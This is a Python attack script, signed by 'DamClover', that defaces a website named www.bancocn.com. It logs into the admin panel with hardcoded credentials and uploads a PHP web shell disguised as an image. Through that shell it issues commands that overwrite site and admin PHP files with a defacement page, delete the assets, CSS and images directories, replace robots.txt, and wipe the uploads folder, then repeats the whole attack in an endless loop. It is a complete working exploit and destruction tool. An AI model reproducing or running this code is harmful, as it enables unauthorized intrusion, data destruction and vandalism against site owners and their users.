import requests
from bs4 import BeautifulSoup as bs4
import time

def deface():
    login_url = "http://www.bancocn.com/admin/index.php"
    login_headers = {
        "Host": "www.bancocn.com",
        "Origin": "http://www.bancocn.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://www.bancocn.com/admin/login.php",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

    login_data = {
        "user": "admin",
        "password": "senhafoda"
    }

    print("Getting system credentials...\n")
    session = requests.Session()
    login_response = session.post(login_url, headers=login_headers, data=login_data)

    if login_response.status_code == 200:
        pass
    else:
        print("Failed to fetch credentials.\n")

    upload_url = "http://www.bancocn.com/admin/index.php"
    upload_headers = {
        "Host": "www.bancocn.com",
        "Origin": "http://www.bancocn.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://www.bancocn.com/admin/new.php",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

    files = {
        "title": (None, "damclover.php5"),
        "image": ("damclover.php5", open("damclover.php5", "rb"), "application/octet-stream"),
        "category": (None, "1"),
        "Add": (None, "Add")
    }

    print("Uploading shell file...\n")
    upload_response = session.post(upload_url, headers=upload_headers, files=files)

    files2 = {
        "title": (None, "damclover.html"),
        "image": ("damclover.html", open("damclover.html", "rb"), "application/octet-stream"),
        "category": (None, "1"),
        "Add": (None, "Add")
    }

    print("Uploading deface file...\n")
    upload_response2 = session.post(upload_url, headers=upload_headers, files=files2)

    shell_headers = {
        "Host": "www.bancocn.com",
        "Origin": "http://www.bancocn.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://www.bancocn.com/admin/new.php",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

    data = {
        "senha": "nothingissecure"
    }

    login_shell = session.post("http://www.bancocn.com/admin/uploads/damclover.php5", headers=shell_headers, data=data)

    dchtml = "/var/www/html/admin/uploads/damclover.html"
    commands = [f"cp damclover.html /var/www/html/index.php", 
                f"cp {dchtml} /var/www/html/cat.php", 
                f"cp {dchtml} /var/www/html/all.php", 
                f"cp {dchtml} /var/www/html/footer.php",
                f"cp {dchtml} /var/www/html/header.php",
                f"cp {dchtml} /var/www/html/show.php",
                
                "rm -r /var/www/html/robots.txt",
                "echo 'NOTHING IS SECURE. by DamClover' > /var/www/html/robots.txt",

                f"cp {dchtml} /var/www/html/classes/auth.php",
                f"cp {dchtml} /var/www/html/classes/category.php",
                f"cp {dchtml} /var/www/html/classes/phpfix.php",
                f"cp {dchtml} /var/www/html/classes/picture.php",
                f"cp {dchtml} /var/www/html/classes/stats.php",
                f"cp {dchtml} /var/www/html/classes/user.php",

                "rm -r /var/www/html/assets",
                "rm -r /var/www/html/css",
                "rm -r /var/www/html/images",

                f"cp {dchtml} /var/www/html/admin/del.php",
                f"cp {dchtml} /var/www/html/admin/footer.php",
                f"cp {dchtml} /var/www/html/admin/header.php",
                f"cp {dchtml} /var/www/html/admin/index.php",
                f"cp {dchtml} /var/www/html/admin/login.php",
                f"cp {dchtml} /var/www/html/admin/logou.php",
                f"cp {dchtml} /var/www/html/admin/new.php",
                
                "echo 'Script by DamClover@proton.me' > README_BY_DAMCLOVER.txt",

                "find /var/www/html/admin/uploads -type f ! -name 'README_BY_DAMCLOVER.txt' -delete"
                ]

    print("Corrupting system files...\n")
    for c in commands:
        data_shell = {
            "cmd": f"{c}"
        }
        deface = session.post("http://www.bancocn.com/admin/uploads/damclover.php5", headers=shell_headers, data=data_shell)

    print("Status Code:", deface.status_code)
    print("Corrupted files. Complete deface.\n")
    return deface.status_code

if __name__ == "__main__":
    try:

        while True:
            sc = deface()
            if sc == 200:
                deface()
            else:
                time.sleep(30)

    except Exception as e:
        print(f"ERROR: {e}")
